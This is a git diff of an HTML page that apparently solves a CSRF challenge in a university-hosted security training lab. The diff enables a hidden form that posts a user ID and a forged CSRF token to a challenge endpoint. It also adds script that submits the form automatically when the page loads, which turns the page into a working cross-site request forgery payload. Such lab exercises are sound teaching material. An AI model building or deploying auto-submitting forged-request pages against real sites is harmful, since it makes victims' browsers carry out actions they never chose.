@@ -1,36 +1,13 @@
 <!DOCTYPE html>
 
-<!--
 <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengesix/plusplus" method="POST">
 <input type="hidden" name="userId" value="09b532b01c801fd7c25b83fad47c7e8df894b588" />
-<input type="hidden" name="csrfToken" value="159533118117138084132674929016743024556" />
+<input type="hidden" name="csrfToken" value="-32744941621354392346795477441239319693" />
 <input type="submit"/>
 </form>
 
-
 <form name="getter" action="https://snickerboa.it.liu.se/user/csrfchallengeseven/getToken?userId=09b532b01c801fd7c25b83fad47c7e8df894b588" method="GET"></form>
--->
-<html>
-<head>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
 
 <script>
-//document.getter.submit()
-//document.csrfForm.submit();
-$(document).ready(function(){
-    $("button").click(function(){
-      $("#div1").load("/user/csrfchallengeseven/getToken?userId=09b532b01c801fd7c25b83fad47c7e8df894b588",function(responseTxt,statusTxt,xhr){
-        if(statusTxt=="success")
-          alert("External content loaded successfully!");
-        if(statusTxt=="error")
-          alert("Error: "+xhr.status+": "+xhr.statusText);
-      });
-    });
-  });
+document.csrfForm.submit();
 </script>
-
-<div id="div1"><h2>Let jQuery AJAX Change This Text</h2></div>
-<button>Get External Content</button>
-
-</body>
-</html>
